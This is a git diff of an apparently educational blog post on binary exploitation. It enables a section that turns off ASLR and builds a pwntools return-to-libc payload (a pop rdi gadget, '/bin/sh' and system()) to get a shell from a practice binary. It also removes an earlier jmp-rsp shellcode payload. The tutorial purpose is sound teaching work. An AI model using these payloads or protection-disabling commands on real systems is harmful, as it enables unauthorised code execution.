@@ -1,9 +1,9 @@
 ---
 author: pl4int3xt
 layout: post
-title: Buffer overfl0w 02
+title: Buffer overfl0w 02 - inject shellcodes & return2libc
 date: '2024-01-11'
-description: "Learn more basic techniques of exploiting buffer overflows in binaries"
+description: "Learn how to inject shellcodes and return to libc using buffer overflow"
 categories: [Binary Exploitation 101]
 tags: [Buffer overflow, binary exploitation]
 ---
@@ -256,7 +256,7 @@ $
 
 We successfully executed our malicious shellcode.
 
-<!-- ## NX Enabl3d
+## NX Enabled
 When we enable NX our pevious script won't execute the shellcode. Let's compile our previous fallout code without execstack option
 
 ```c
@@ -290,16 +290,16 @@ Our code is dynamically linked. This means that the code does not include the li
 
 Whenever the code wants to access those functions, it will first look for the functions in the `global offset table`. The table contains the address of the libc functions on the system. This means we can return to functions in libc such as `system()` and strings such as `/bin/sh`. The libc in our system has a protection `aslr` that randomizes the addresses of binaries to prevent buffer overflow attacks. Let's first disable it 
 
-```
+```shell
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
 
 Running ldd we get the fixed base address of the libc library.
 
-```
+```shell
 pl4int3xt@archlinux ~/D/p/shellcode> ldd fall0ut
 	linux-vdso.so.1 (0x00007ffff7fc8000)
-	libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff7dc2000)
+	libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff7dc0000)
 	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fca000)
 ```
 
@@ -329,18 +329,16 @@ io = start()
 # How many bytes to the instruction pointer (RIP)?
 padding = 72
 
-jmp_rsp = asm('jmp rsp')
-jmp_rsp = next(elf.search(jmp_rsp))
-
-shellcode = asm(shellcraft.cat('message.txt'))
-
-shellcode += asm(shellcraft.exit())
+pop_rdi = p64(0x0000000000028265)
+bin_sh = next(libc.search(b'/bin/sh\x00'))
+system = libc.symbols.system
 
 payload = flat(
     asm('nop') * padding,
-    jmp_rsp,
-    asm('nop') * 16,
-    shellcode
+    pop_rdi,
+    bin_sh,
+    p64(0x000000000040101a),
+    system
 )
 
 # Save the payload to file
@@ -351,4 +349,4 @@ io.sendlineafter(b'>', payload)
 
 # Receive the flag
 io.interactive()
-``` -->
+```
